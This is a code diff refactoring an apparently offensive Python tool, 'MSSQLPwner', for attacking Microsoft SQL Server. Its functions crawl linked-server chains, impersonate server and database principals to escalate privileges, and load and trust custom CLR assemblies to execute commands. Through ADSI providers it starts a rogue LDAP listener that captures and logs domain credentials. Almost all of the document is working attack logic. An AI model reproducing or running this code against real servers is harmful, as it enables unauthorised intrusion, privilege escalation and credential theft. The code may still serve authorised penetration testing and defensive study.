@@ -12,24 +12,21 @@ import copy
 import time
 import json
 import logging
+import argparse
 import utilities
 from impacket import LOG
 from typing import Callable
 from impacket import version
+from playbooks import modules
 from playbooks import Queries
-from typing import Literal, Union
+from typing import Literal, Union, Any
 from impacket.examples import logger
 from base_sql_client import BaseSQLClient
 from impacket.examples.utils import parse_target
 
 
-# TODO: Change the link server list and retrieve both servers and chains
-# TODO: Check if our user is sysadmin, if it is, the IMPERSONATION is not relevant.
-# TODO: Detect architecture
-# TODO: Add cross-impersonation within the linked server execution chain
-
 class MSSQLPwner(BaseSQLClient):
-    def __init__(self, server_address, username, args_options):
+    def __init__(self, server_address, user_name, args_options):
         super().__init__(server_address, args_options)
         if args_options.debug is True:
             logging.getLogger("impacket").setLevel(logging.DEBUG)
@@ -39,15 +36,14 @@ class MSSQLPwner(BaseSQLClient):
             logging.getLogger("impacket").setLevel(logging.INFO)
 
         self.use_state = not args_options.no_state
-        self.username = username
+        self.username = user_name
         self.server_address = server_address
         self.debug = args_options.debug
-        self.state_filename = f"{server_address}_{username}.state"
+        self.state_filename = f"{server_address}_{user_name}.state"
         self.state = {
-            "linkable_servers": dict(), "server_principals": dict(), "database_principals": dict(),
-            "server_principals_history": dict(), "database_principals_history": dict(),
-            "adsi_provider_servers": dict(), "hostname": "", "chain_ids": dict(), "server_groups": dict(),
-            "database_groups": dict()
+            "local_hostname": str(),
+            "servers_info": dict()
+
         }
         self.rev2self = dict()
         self.max_recursive_links = args_options.max_recursive_links
@@ -56,34 +52,205 @@ class MSSQLPwner(BaseSQLClient):
         self.chain_id = options.chain_id
         self.auto_yes = options.auto_yes
 
+    def add_to_server_state(self, linked_server: str, key: str, value: Any, remove_duplicates: bool = True):
+        """
+            This function is responsible to add the server items to the server state.
+        """
+        if linked_server not in self.state['servers_info'].keys():
+            self.state['servers_info'][linked_server] = {
+                "hostname": "",
+                "chain_str": linked_server,
+                "chain_tree": list(),
+                "db_user": "",
+                "server_user": "",
+                "link_name": "",
+                "instance_name": "",
+                "version": "",
+                "domain_name": "",
+                "chain_id": "",
+                "server_principals": list(),
+                "database_principals": list(),
+                "server_roles": list(),
+                "database_roles": list(),
+                "trustworthy_db_list": list(),
+                "adsi_providers": list(),
+                "server_principals_history": list(),
+                "database_principals_history": list()
+
+            }
+        if isinstance(self.state['servers_info'][linked_server][key], list):
+            if not isinstance(value, list):
+                value = [value]
+            for v in value:
+                if v in self.state['servers_info'][linked_server][key] and remove_duplicates:
+                    continue
+                self.state['servers_info'][linked_server][key].append(v)
+
+        elif isinstance(self.state['servers_info'][linked_server][key], dict):
+            for k, v in value.items():
+                self.state['servers_info'][linked_server][key][k] = v
+        else:
+            self.state['servers_info'][linked_server][key] = value
+
     def is_valid_chain_id(self) -> bool:
         """
             This function is responsible to check if the given chain id is valid.
         """
         if self.chain_id:
-            if str(self.chain_id) not in self.state['chain_ids'].keys():
+            filtered_servers = utilities.filter_servers_by_chain_id(self.state['servers_info'], self.chain_id)
+
+            if not filtered_servers:
                 LOG.error(f"Chain id {self.chain_id} is not in the chain ids list")
                 return False
-            chain_str = self.state['chain_ids'][str(self.chain_id)]
-            if chain_str not in self.state['linkable_servers'].keys():
-                LOG.error(f"Chain {chain_str} is not in the chain list")
-                return False
-            LOG.info(f"Chosen chain: {chain_str} (ID: {str(self.chain_id)})")
+            chain_str = list(filtered_servers.keys())[0]
+            LOG.info(f"Chosen chain: {chain_str} (ID: {self.chain_id})")
         return True
 
-    def retrieve_link_server_from_chain_id(self, chain_id: int) -> str:
+    def get_chain_title(self):
+        """
+            This function is responsible to get the chain title.
+        """
+        filtered_servers = utilities.filter_servers_by_chain_id(self.state['servers_info'], self.chain_id)
+        chain_str = list(filtered_servers.keys())[0]
+        username = filtered_servers[chain_str]['server_user']
+        db_user = filtered_servers[chain_str]['db_user']
+        return f"{chain_str} (Server user: {username} | DB User: {db_user})"
+
+    def get_linked_server_title(self, linked_server: str):
+        """
+            This function is responsible to get the linked server title.
+        """
+        filtered_servers = utilities.filter_servers_by_link_name(self.state['servers_info'], linked_server)
+        chain_str = list(filtered_servers.keys())[0]
+        username = filtered_servers[chain_str]['server_user']
+        db_user = filtered_servers[chain_str]['db_user']
+        return f"{chain_str} (Server user: {username} | DB User: {db_user})"
+
+    def is_valid_link_server(self, linked_server: str) -> bool:
+        """
+            This function is responsible to check if the given linked server is valid.
+        """
+
+        filtered_servers = utilities.filter_servers_by_link_name(self.state['servers_info'], linked_server)
+
+        if not filtered_servers:
+            LOG.error(f"{linked_server} is not in the linked servers list")
+            return False
+        LOG.info(f"Chosen linked server: {linked_server}")
+        return True
+
+    def detect_architecture(self, linked_server: str) -> str:
+        """
+            This function is responsible to detect the architecture of a remote server.
+        """
+        for _, server_info in utilities.filter_servers_by_link_name(self.state['servers_info'], linked_server).items():
+            for x64_sig in ["<x64>", "(X64)", "(64-bit)"]:
+                if x64_sig in server_info['version']:
+                    return "x64"
+            for x86_sig in ["<x86>", "(X86)", "(32-bit)"]:
+                if x86_sig in server_info['version']:
+                    return "x86"
+        return ""
+
+    def retrieve_link_server_from_chain_id(self, chain_id: int) -> dict:
         """
             This function is responsible to retrieve the link server from the given chain id.
         """
-        return self.state['chain_ids'][str(chain_id)]
+        return utilities.filter_servers_by_chain_id(self.state['servers_info'], chain_id)
 
-    def retrieve_links(self, linked_server: str, old_state: list = None) -> None:
+    def get_chain_list(self) -> None:
+        """
+        This function is responsible to return the chain list.
+        """
+        for chain_str, server_info in utilities.sort_servers_by_chain_id(self.state['servers_info']).items():
+            username = server_info['server_user']
+            db_user = server_info['db_user']
+            LOG.info(f"{server_info['chain_id']} - {chain_str} (Server user: {username} | DB User: {db_user})")
+
+    def retrieve_server_information(self, linked_server: str = None, linked_server_name: str = None) -> bool:
+        """
+            This function is responsible to retrieve the server information.
+        """
+        if linked_server:
+            server_information = self.build_chain(Queries.SERVER_INFORMATION, linked_server)
+            user_information = self.build_chain(Queries.USER_INFORMATION, linked_server)
+            trustworthy_db_list_results = self.build_chain(Queries.TRUSTWORTHY_DB_LIST, linked_server)
+            server_roles = self.build_chain(Queries.GET_USER_SERVER_ROLES, linked_server)
+            db_roles = self.build_chain(Queries.GET_USER_DATABASE_ROLES, linked_server)
+            server_principals = self.build_chain(Queries.CAN_IMPERSONATE_AS_SERVER_PRINCIPAL, linked_server)
+            db_principals = self.build_chain(Queries.CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL, linked_server)
+        else:
+            server_information = self.custom_sql_query(Queries.SERVER_INFORMATION)
+            user_information = self.custom_sql_query(Queries.USER_INFORMATION)
+            trustworthy_db_list_results = self.custom_sql_query(Queries.TRUSTWORTHY_DB_LIST)
+            server_roles = self.custom_sql_query(Queries.GET_USER_SERVER_ROLES)
+            db_roles = self.custom_sql_query(Queries.GET_USER_DATABASE_ROLES)
+            server_principals = self.custom_sql_query(Queries.CAN_IMPERSONATE_AS_SERVER_PRINCIPAL)
+            db_principals = self.custom_sql_query(Queries.CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL)
+
+        if not server_information['is_success']:
+            LOG.error(f"Failed to retrieve server information from {linked_server}")
+            return False
+
+        if not user_information['is_success']:
+            LOG.error(f"Failed to retrieve user information from {linked_server}")
+            return False
+
+        db_user = user_information['results'][0]['db_user']
+        server_user = user_information['results'][0]['server_user']
+
+        hostname = utilities.remove_service_name(server_information['results'][0]['hostname'])
+
+        domain_name = server_information['results'][0]['domain_name']
+        server_version = server_information['results'][0]['server_version']
+        instance_name = server_information['results'][0]['instance_name']
+
+        if not linked_server:
+            hostname = f"{hostname.split('.')[0]}.{self.domain}"
+            self.state['local_hostname'] = hostname
+            LOG.info(f"Discovered hostname: {hostname}")
+            linked_server = hostname
+        linked_server_name = linked_server_name if linked_server_name else hostname
+        self.add_to_server_state(linked_server, "hostname", hostname)
+        self.add_to_server_state(linked_server, "link_name", linked_server_name)
+        self.add_to_server_state(linked_server, "db_user", db_user)
+        self.add_to_server_state(linked_server, "server_user", server_user)
+        self.add_to_server_state(linked_server, "version", server_version)
+        self.add_to_server_state(linked_server, "domain_name", domain_name)
+        self.add_to_server_state(linked_server, "instance_name", instance_name)
+        self.add_to_server_state(linked_server, "chain_id", self.current_chain_id)
+        self.current_chain_id += 1
+
+        if trustworthy_db_list_results['is_success']:
+            for db_name in trustworthy_db_list_results['results']:
+                self.add_to_server_state(linked_server, "trustworthy_db_list", db_name['name'])
+
+        if server_roles['is_success']:
+            for server_role in server_roles['results']:
+                self.add_to_server_state(linked_server, "server_roles", server_role['group'])
+
+        if db_roles['is_success']:
+            for db_role in db_roles['results']:
+                self.add_to_server_state(linked_server, "database_roles", db_role['group'])
+
+        if server_principals['is_success']:
+            for server_principal in server_principals['results']:
+                self.add_to_server_state(linked_server, "server_principals", server_principal['username'])
+
+        if db_principals['is_success']:
+            for db_principal in db_principals['results']:
+                self.add_to_server_state(linked_server, "database_principals", db_principal['username'])
+        return True
+
+    def retrieve_links(self, linked_server: str = None, old_state: list = None) -> None:
         """
             This function is responsible to retrieve all the linkable servers recursively.
         """
+        if not linked_server:
+            linked_server = self.state['local_hostname']
         state = copy.copy(old_state)
         state = state if state else [linked_server]
-        rows = self.build_chain(Queries.LINKABLE_SERVERS, linked_server)
+        rows = self.build_chain(Queries.GET_LINKABLE_SERVERS, linked_server)
         if not rows['is_success']:
             LOG.warning(f"Failed to retrieve linkable servers from {linked_server}")
             return
@@ -98,23 +265,21 @@ class MSSQLPwner(BaseSQLClient):
 
             linkable_server = utilities.remove_service_name(row['SRV_NAME'])
             if row['SRV_PROVIDERNAME'].lower() == "adsdsoobject":
-                adsi_chain_str = f"{' -> '.join(state)} (Provider: {linkable_server})"
-                if adsi_chain_str in self.state['adsi_provider_servers'].keys():
-                    continue
-                self.state['adsi_provider_servers'][adsi_chain_str] = state + [linkable_server]
+                self.add_to_server_state(linked_server, "adsi_providers", linkable_server)
+                continue
+
+            if linkable_server == state[-1].split(".")[0] or linkable_server in state[1:]:
                 continue
 
             linkable_chain_str = f"{' -> '.join(state)} -> {linkable_server}"
-            if linkable_server == state[-1].split(".")[0]:
-                continue
-
-            self.state['linkable_servers'][linkable_chain_str] = state + [linkable_server]
-            self.state['chain_ids'][str(self.current_chain_id)] = linkable_chain_str
-            self.current_chain_id += 1
-            if linkable_server == self.state['hostname'] or linkable_server in state \
+            self.add_to_server_state(linkable_chain_str, "chain_tree", state + [linkable_server],
+                                     remove_duplicates=False)
+            self.add_to_server_state(linkable_chain_str, "link_name", linkable_server)
+            self.retrieve_server_information(linkable_chain_str, linkable_server)
+            if linkable_server == self.state['local_hostname'] or linkable_server in state \
                     or len(state) >= self.max_recursive_links:
                 continue
-            self.retrieve_links(linkable_chain_str, self.state['linkable_servers'][linkable_chain_str])
+            self.retrieve_links(linkable_chain_str, self.state['servers_info'][linkable_chain_str]['chain_tree'])
 
     def direct_query(self, query: str, linked_server: str, method: Literal['OpenQuery', 'exec_at'] = "OpenQuery",
                      decode_results: bool = True, print_results: bool = False) -> bool:
@@ -130,6 +295,8 @@ class MSSQLPwner(BaseSQLClient):
             if self.can_impersonate(linked_server):
                 if utilities.receive_answer("No results were returned. try to escalate privileges?", ['y', 'n'], 'y'):
                     return False
+                else:
+                    return True
 
         for result in results['results']:
             for key, value in result.items():
@@ -145,7 +312,7 @@ class MSSQLPwner(BaseSQLClient):
         chained_query = query
 
         # If the first server is the current server, remove it
-        flow = flow[1:] if flow[0] == self.state['hostname'] else flow
+        flow = flow[1:] if flow[0] == self.state['local_hostname'] else flow
         for link in flow[::-1]:  # Iterates over the linked servers
             chained_query = method_func(link, chained_query)
         return chained_query
@@ -162,10 +329,10 @@ class MSSQLPwner(BaseSQLClient):
         """
         if not linked_server:
             return query
-        if linked_server not in self.state['linkable_servers'].keys():
-            LOG.error(f"Server {linked_server} is not linkable from {self.state['hostname']}")
+        if linked_server not in self.state['servers_info'].keys():
+            LOG.error(f"Server {linked_server} is not linkable from {self.state['local_hostname']}")
             return None
-        return self.build_query_chain(self.state['linkable_servers'][linked_server], query, method)
+        return self.build_query_chain(self.state['servers_info'][linked_server]['chain_tree'], query, method)
 
     def build_chain(self, query: str, linked_server: str,
                     method: Literal['OpenQuery', 'blind_OpenQuery', 'exec_at'] = "OpenQuery",
@@ -174,7 +341,7 @@ class MSSQLPwner(BaseSQLClient):
          This function is responsible to build the query chain for the given query and method.
         """
         query = f"{self.execute_as}{query}"
-        if linked_server != self.state['hostname']:
+        if linked_server != self.state['local_hostname']:
             if method == "blind_OpenQuery":
                 query = f"SELECT 1; {query}"
             query = self.build_linked_query_chain(linked_server, query, method)
@@ -184,105 +351,17 @@ class MSSQLPwner(BaseSQLClient):
 
         return self.custom_sql_query(query, print_results=print_results, decode_results=decode_results, wait=wait)
 
-    def get_granted_server_principals(self, linked_server: str) -> None:
-        """
-        This function is responsible to retrieve all the server impersonation users recursively.
-        """
-        rows = self.build_chain(Queries.CAN_IMPERSONATE_AS_SERVER_PRINCIPAL, linked_server)
-        if not rows['is_success']:
-            LOG.warning(f"Failed to retrieve server principals user list from {linked_server}")
-            return
-
-        if linked_server not in self.state['server_principals'].keys():
-            self.state['server_principals'][linked_server] = set()
-
-        for row in rows['results']:
-            if "IMPERSONATE" not in row['permission_name'] and not utilities.is_privileged(
-                    self.state['server_groups'][linked_server], self.high_privileged_server_groups):
-                continue
-            if row['username'] in self.state['server_principals'][linked_server]:
-                continue
-            self.state['server_principals'][linked_server].add(row['username'])
-            LOG.info(f"Can impersonate as {row['username']} server principal on {linked_server} chain")
-
-    def get_user_server_groups(self, linked_server: str) -> None:
-        """
-        This function is responsible to retrieve all server groups our user is member of.
-        """
-        rows = self.build_chain(Queries.GET_USER_SERVER_GROUPS, linked_server)
-        if not rows['is_success']:
-            LOG.warning(f"Failed to retrieve user server groups list from {linked_server}")
-            return
-
-        if linked_server not in self.state['server_groups'].keys():
-            self.state['server_groups'][linked_server] = set()
-
-        for row in rows['results']:
-            self.state['server_groups'][linked_server].add(row['group'])
-            LOG.info(f"Our user is member of the {row['group']} server group on {linked_server} chain")
-
-    def get_user_database_groups(self, linked_server: str) -> None:
-        """
-        This function is responsible to retrieve all server groups our user is member of.
-        """
-        rows = self.build_chain(Queries.GET_USER_DATABASE_GROUPS, linked_server)
-        if not rows['is_success']:
-            LOG.warning(f"Failed to retrieve user database groups list from {linked_server}")
-            return
-
-        if linked_server not in self.state['database_groups'].keys():
-            self.state['database_groups'][linked_server] = set()
-
-        for row in rows['results']:
-            self.state['database_groups'][linked_server].add(row['group'])
-            LOG.info(f"Our user is member of the {row['group']} database group on {linked_server} chain")
-
-    def get_granted_database_principals(self, linked_server: str) -> None:
-        """
-        This function is responsible to retrieve all the database impersonation users recursively.
-        """
-        rows = self.build_chain(Queries.CAN_IMPERSONATE_AS_DATABASE_PRINCIPAL, linked_server)
-        if not rows['is_success']:
-            LOG.warning(f"Failed to retrieve database principals user list from {linked_server}")
-            return
-
-        if linked_server not in self.state['database_principals'].keys():
-            self.state['database_principals'][linked_server] = set()
-
-        for row in rows['results']:
-            if "IMPERSONATE" not in row['permission_name'] and not utilities.is_privileged(
-                    self.state['database_groups'][linked_server], self.high_privileged_database_groups):
-                continue
-            if row['username'] in self.state['database_principals'][linked_server]:
-                continue
-            self.state['database_principals'][linked_server].add(row['username'])
-            LOG.info(f"Can impersonate as {row['username']} database principal on {linked_server} chain")
-
     def can_impersonate(self, linked_server: str) -> bool:
         """
         This function is responsible to check if we can impersonate as other users.
         """
-        if linked_server in self.state['database_principals'].keys():
-            if self.state['database_principals'][linked_server]:
+        if linked_server in self.state['servers_info'].keys():
+            if self.state['servers_info'][linked_server]['database_principals']:
                 return True
-        if linked_server in self.state['server_principals'].keys():
-            if self.state['server_principals'][linked_server]:
+        if linked_server in self.state['servers_info'].keys():
+            if self.state['servers_info'][linked_server]['server_principals']:
                 return True
         return False
-
-    def retrieve_hostname(self) -> bool:
-        """
-        This function is responsible to retrieve the hostname of the server.
-        """
-        row = self.custom_sql_query(Queries.SERVER_HOSTNAME)
-        if not row['is_success']:
-            LOG.error("Failed to retrieve server hostname")
-            return False
-        self.state['hostname'] = utilities.remove_service_name(row['results'][0]['ServerName'])
-        LOG.info(f"Discovered hostname: {self.state['hostname']}")
-        if self.domain:
-            self.state['hostname'] += f".{self.domain}"
-        return True
 
     def enumerate(self) -> bool:
         """
@@ -293,37 +372,17 @@ class MSSQLPwner(BaseSQLClient):
                 if self.auto_yes or utilities.receive_answer("State file already exists, do you want to use it?",
                                                              ["y", "n"], 'y'):
                     self.state = json.load(open(self.state_filename))
-                    utilities.print_state(self.state)
-                    if not self.is_valid_chain_id():
+                else:
+                    if not self.retrieve_server_information():
                         return False
-                    return True
-            os.remove(self.state_filename)
-
-        if not self.retrieve_hostname():
-            return False
-
-        self.retrieve_links(self.state['hostname'])
-        LOG.info("Linkable servers:")
-        for chain_id, chain in self.state['chain_ids'].items():
-            LOG.info(f"\t{chain} (ID: {chain_id})")
-
-        for adsi_chain_str in self.state['adsi_provider_servers'].keys():
-            LOG.info(f"{adsi_chain_str} is an ADSI provider (can be abused by the retrieve-password module!)")
-
-        self.get_user_server_groups(self.state['hostname'])
-        self.get_user_database_groups(self.state['hostname'])
-        self.get_granted_server_principals(self.state['hostname'])
-        self.get_granted_database_principals(self.state['hostname'])
-
-        for linked_server in list(self.state['linkable_servers'].keys()) + [self.state['hostname']]:
-            self.get_user_server_groups(linked_server)
-            self.get_user_database_groups(linked_server)
-            self.get_granted_server_principals(linked_server)
-            self.get_granted_database_principals(linked_server)
+                    self.retrieve_links()
+        else:
+            if not self.retrieve_server_information():
+                return False
+            self.retrieve_links()
 
         utilities.store_state(self.state_filename, self.state)
-        if not self.is_valid_chain_id():
-            return False
+        utilities.print_state(self.state)
         return True
 
     def reconfigure_procedure(self, procedure: str, linked_server: str, required_status: bool) -> bool:
@@ -417,6 +476,7 @@ class MSSQLPwner(BaseSQLClient):
 
         my_hash = utilities.calculate_sha512_hash(asm_file_location)
         is_app_trusted = self.build_chain(Queries.IS_MY_APP_TRUSTED.format(my_hash=my_hash), linked_server)
+
         if (not is_app_trusted['is_success']) or (is_app_trusted['results'][0]['status'] == 'False'):
             trust_asm = self.build_chain(Queries.TRUST_MY_APP.format(my_hash=my_hash), linked_server, method="exec_at")
             if not trust_asm['is_success']:
@@ -425,7 +485,6 @@ class MSSQLPwner(BaseSQLClient):
 
             LOG.info(f"Trusting our custom assembly")
             self.add_rev2self_cmd(linked_server, Queries.UNTRUST_MY_APP.format(my_hash=my_hash))
-
         add_custom_asm = self.build_chain(Queries.ADD_CUSTOM_ASM.format(custom_asm=custom_asm_hex, asm_name=asm_name),
                                           linked_server, method="exec_at")
         if (not add_custom_asm['is_success']) and 'already exists in database' not in add_custom_asm['replay']:
@@ -450,7 +509,6 @@ class MSSQLPwner(BaseSQLClient):
         if (not add_procedure['is_success']) and 'is already an object named' not in add_procedure['replay']:
             LOG.error(f"Failed to create procedure")
             return False
-
         self.add_rev2self_cmd(linked_server, Queries.DROP_PROCEDURE.format(procedure_name=procedure_name))
         self.add_rev2self_cmd(linked_server, Queries.DROP_ASSEMBLY.format(asm_name=asm_name))
 
@@ -473,7 +531,6 @@ class MSSQLPwner(BaseSQLClient):
 
         if not self.add_new_custom_asm(asm_file_location, linked_server, "FuncAsm"):
             return False
-
         add_function = self.build_chain(Queries.CREATE_FUNCTION.format(
             function_name=function_name, asm_name='FuncAsm', namespace=namespace,
             class_name=class_name, arg="@port int"),
@@ -481,91 +538,70 @@ class MSSQLPwner(BaseSQLClient):
 
         self.add_rev2self_cmd(linked_server, Queries.DROP_FUNCTION.format(function_name=function_name))
         self.add_rev2self_cmd(linked_server, Queries.DROP_ASSEMBLY.format(asm_name='FuncAsm'))
-        if (not add_function['is_success']) and 'is already an object named' not in add_function['replay']:
+        if (not add_function['is_success']) and 'already exists in database' not in add_function['replay']:
             LOG.error(f"Failed to create procedure")
             return False
-
         function_query = Queries.FUNCTION_EXECUTION.format(function_name=function_name, command=command)
 
         if not self.build_chain(function_query, linked_server, method="OpenQuery", wait=False):
             LOG.error(f"Failed to execute custom assembly")
             return False
+        LOG.info(f"Successfully executed custom assembly")
         return True
 
-    def impersonate_as_server_principal(self, linked_server: str) -> bool:
+    def impersonate_as(self, linked_server: str, principal_type: Literal['server', 'database']) -> bool:
         """
-        This function is responsible to impersonate as a server principal.
+        This function is responsible to impersonate as a server or database principal.
         """
         self.execute_as = ""
-        if linked_server not in self.state['server_principals'].keys():
+        if linked_server not in self.state['servers_info'].keys():
             return False
 
-        if linked_server not in self.state['server_principals_history'].keys():
-            self.state['server_principals_history'][linked_server] = set()
-
-        for user in self.state['server_principals'][linked_server]:
-            if user in self.state['server_principals_history'][linked_server]:
+        for user in self.state['servers_info'][linked_server][f'{principal_type}_principals']:
+            if user in self.state['servers_info'][linked_server][f'{principal_type}_principals_history']:
                 continue
 
             if not self.auto_yes:
-                if utilities.receive_answer(f"Can i attempt to impersonate as {user} server principal on {linked_server}?",
+                if utilities.receive_answer(f"Try to impersonate as {user} {principal_type} "
+                                            f"principal on {linked_server}?",
                                             ["y", "n"], 'n'):
                     LOG.info(f"Skipping impersonation as {user} server principal on {linked_server}")
                     continue
 
-            LOG.info(f"Trying to impersonate as {user} server principal on {linked_server}")
+            LOG.info(f"Trying to impersonate as {user} {principal_type} principal on {linked_server}")
             # Log the server principal in order to avoid infinite loop
-            self.state['server_principals_history'][linked_server].add(user)
-            if self.build_chain(Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user), linked_server,
-                                method="exec_at")['is_success']:
-                LOG.info(f"Successfully impersonated as {user} server principal on {linked_server}")
+
+            if principal_type == 'server':
+                query = Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user)
+            else:
+                query = Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL.format(username=user)
+
+            self.add_to_server_state(linked_server, f'{principal_type}_principals_history', user)
+            if self.build_chain(query, linked_server, method="exec_at")['is_success']:
+                LOG.info(f"Successfully impersonated as {user} {principal_type} principal on {linked_server}")
                 self.execute_as = Queries.IMPERSONATE_AS_SERVER_PRINCIPAL.format(username=user)
                 return True
-        return False
-
-    def impersonate_as_database_principal(self, linked_server: str) -> bool:
-        """
-        This function is responsible to impersonate as a database principal.
-        """
-        self.execute_as = ""
-        if linked_server not in self.state['database_principals'].keys():
-            return False
-
-        if linked_server not in self.state['database_principals_history'].keys():
-            self.state['database_principals_history'][linked_server] = set()
-
-        for user in self.state['database_principals'][linked_server]:
-            if user in self.state['database_principals_history'][linked_server] or user == 'guest':
-                continue
-            if not self.auto_yes:
-                if utilities.receive_answer(f"Can i attempt to impersonate as "
-                                            f"{user} database principal on {linked_server}?",
-                                            ["y", "n"], 'n'):
-                    LOG.info(f"Skipping impersonation as {user} database principal on {linked_server}")
-                    continue
-
-            # Log the database principal user in order to avoid infinite loop
-            self.state['database_principals_history'][linked_server].add(user)
-            LOG.info(f"Trying to impersonate as {user} database principal on {linked_server}")
-            if self.build_chain(Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL.format(username=user), linked_server,
-                                method="exec_at")['is_success']:
-                LOG.info(f"Successfully impersonated as {user} database principal on {linked_server}")
-                self.execute_as = Queries.IMPERSONATE_AS_DATABASE_PRINCIPAL.format(username=user)
-                return True
-
         return False
 
     def filter_relevant_chains(self, linked_server: str) -> list:
         """
         This function is responsible to filter the relevant chains.
         """
-        sorted_dict = dict(sorted(self.state['linkable_servers'].items(), key=lambda item: len(item[1])))
         if self.chain_id:
-            chain_str = self.state['chain_ids'][str(self.chain_id)]
-            yield chain_str, sorted_dict[chain_str]
+            server_info = list(self.retrieve_link_server_from_chain_id(self.chain_id).values())[0]
+            chain_str = server_info['chain_str']
+            chain_list = server_info['chain_tree']
+            if not chain_list:
+                chain_list = chain_str
+            yield chain_str, chain_list
             return
 
-        for chain_str, chain_list in sorted_dict.items():
+        sorted_dict = utilities.sort_servers_by_chain_id(self.state['servers_info'])
+        for chain_str, server_info in sorted_dict.items():
+            chain_list = server_info['chain_tree']
+            if not chain_list:
+                chain_list = chain_str
+
             if chain_list[-1] != linked_server:
                 continue
 
@@ -594,7 +630,7 @@ class MSSQLPwner(BaseSQLClient):
                 LOG.info(f"Successfully reverted to self on {linked_server}")
             self.rev2self[linked_server].clear()
 
-    def procedure_runner(self, func: Callable, args: list, linked_server: str) -> bool:
+    def procedure_runner(self, func: Callable, args: list, **kwargs) -> bool:
         """
         This function is responsible to attempt to run a procedure through local or link server.
         This function will try  to run the procedure through the following methods if no success:
@@ -604,63 +640,69 @@ class MSSQLPwner(BaseSQLClient):
 
         """
         self.execute_as = ""
+        linked_server = kwargs['linked_server']
         if self.can_impersonate(linked_server):
             if self.auto_yes or utilities.receive_answer(f"The {linked_server} server can escalate privileges, "
                                                          f"do you want to continue with the current privileges?",
                                                          ['y', 'n'], 'y'):
-                if func(*args, **{"linked_server": linked_server}):
+                if func(*args, **kwargs):
                     return True
         else:
-            if func(*args, **{"linked_server": linked_server}):
+            if func(*args, **kwargs):
                 return True
 
-        while self.impersonate_as_server_principal(linked_server):
-            if func(*args, **{"linked_server": linked_server}):
+        while self.impersonate_as(linked_server, principal_type='server'):
+            if func(*args, **kwargs):
                 return True
 
-        while self.impersonate_as_database_principal(linked_server):
-            if func(*args, **{"linked_server": linked_server}):
+        while self.impersonate_as(linked_server, principal_type='database'):
+            if func(*args, **kwargs):
                 return True
 
         return False
 
-    def procedure_chain_builder(self, func: Callable, args: list, linked_server: str) -> bool:
+    def procedure_chain_builder(self, func: Callable, args: list, **kwargs) -> bool:
         """
         This function is responsible to build a procedure chain.
         """
+        if 'linked_server' not in kwargs.keys():
+            LOG.error("No linked server was provided")
+            return False
 
-        if (not linked_server) or linked_server == self.state['hostname']:
-            retval = self.procedure_runner(func, args, linked_server)
+        if kwargs['linked_server'] == self.state['local_hostname']:
+            retval = self.procedure_runner(func, args, **kwargs)
             if retval:
-                LOG.info(f"Successfully executed {func.__name__} on {linked_server}")
+                LOG.info(f"Successfully executed {func.__name__} on {kwargs['linked_server']}")
                 return True
 
-            LOG.error(f"{func.__name__} cannot be executed on {linked_server}")
+            LOG.error(f"{func.__name__} cannot be executed on {kwargs['linked_server']}")
             LOG.info("Trying to find a linkable server chain")
 
-        for chain_str, _ in self.filter_relevant_chains(linked_server):
+        for chain_str, _ in self.filter_relevant_chains(kwargs['linked_server']):
             LOG.info(f"Trying to execute {func.__name__} on {chain_str}")
-            if self.procedure_runner(func, args, linked_server=chain_str):
+            kwargs['linked_server'] = chain_str
+            if self.procedure_runner(func, args, **kwargs):
                 LOG.info(f"Successfully executed {func.__name__} on {chain_str}")
                 return True
 
-        LOG.warning(f"Failed to execute {func.__name__} on {linked_server}")
+        LOG.warning(f"Failed to execute {func.__name__} on {kwargs['linked_server']}")
         return False
-
-    def retrieve_adsi_chain_password(self, linked_server: str, adsi_provider: str):
-        for _, chain in self.state['adsi_provider_servers'].items():
-            if adsi_provider and adsi_provider != chain[-1]:
-                continue
-            if linked_server != chain[-2]:
-                continue
-            yield chain
 
     def retrieve_password(self, linked_server: str, port: int, adsi_provider: str):
         is_discovered = False
-        ldap_filename = "LdapServer-x64.dll" if options.arch == 'x64' else "LdapServer-x86.dll"
+        arch = options.arch if options.arch != 'autodetect' else self.detect_architecture(linked_server)
+        if not arch:
+            LOG.error(f"Failed to detect the architecture of {linked_server}")
+            return
+        ldap_filename = "LdapServer-x64.dll" if arch == 'x64' else "LdapServer-x86.dll"
         ldap_file_location = os.path.join("playbooks/custom-asm", ldap_filename)
-        adsi_provider = adsi_provider
-        for chain in self.retrieve_adsi_chain_password(linked_server, adsi_provider):
+        for _, server_info in utilities.filter_servers_by_link_name(self.state['servers_info'], linked_server).items():
+            if not server_info['adsi_providers']:
+                continue
+            if adsi_provider and adsi_provider not in server_info['adsi_providers']:
+                LOG.error(f"The {linked_server} server does not support the {adsi_provider} provider")
+                return
+            adsi_provider = adsi_provider if adsi_provider else server_info['adsi_providers'][0]
             is_discovered = True
             if self.procedure_chain_builder(self.execute_custom_assembly_function,
                                             [ldap_file_location, "listen", "LdapSrv", "ldapAssembly",
@@ -668,25 +710,28 @@ class MSSQLPwner(BaseSQLClient):
                                             linked_server=linked_server):
                 time.sleep(1)
                 client = MSSQLPwner(self.server_address, self.username, self.options)
-
                 client.options.debug = False
                 LOG.setLevel(logging.ERROR)
                 client.connect(username, password, domain)
+                client.state = self.state
                 LOG.setLevel(logging.INFO)
                 client.options.debug = self.options.debug
-                chained_query = self.build_query_chain(chain, Queries.LDAP_QUERY.format(port=port), "OpenQuery")
+                chained_query = self.build_query_chain(server_info['chain_tree'] + [adsi_provider],
+                                                       Queries.LDAP_QUERY.format(port=port), "OpenQuery")
 
                 client.custom_sql_query(chained_query, wait=True)
+                LOG.info("Sleeping for 5 seconds..")
+                time.sleep(5)
                 client.disconnect()
                 tds_data = self.ms_sql.recvTDS()
                 self.ms_sql.replies = self.ms_sql.parseReply(tds_data['Data'], False)
 
                 results = self.parse_logs()
                 if results and results['is_success']:
-                    LOG.info(f"Successfully retrieved password from {' -> '.join(chain)}")
+                    LOG.info(f"Successfully retrieved password from {server_info['chain_str']}")
                     for credentials in results['results'][0].values():
                         LOG.info(f"[+] Discovered credentials: {credentials}")
-                break
+                    break
 
         if not is_discovered:
             LOG.error(f"Failed to access {adsi_provider} ADSI provider on {linked_server}")
@@ -695,9 +740,9 @@ class MSSQLPwner(BaseSQLClient):
 if __name__ == '__main__':
     # Init the example's logger theme
     logger.init()
-
-    parser = utilities.generate_arg_parser()
-
+    parser, available_modules = utilities.generate_arg_parser()
+    available_modules.remove("interactive")
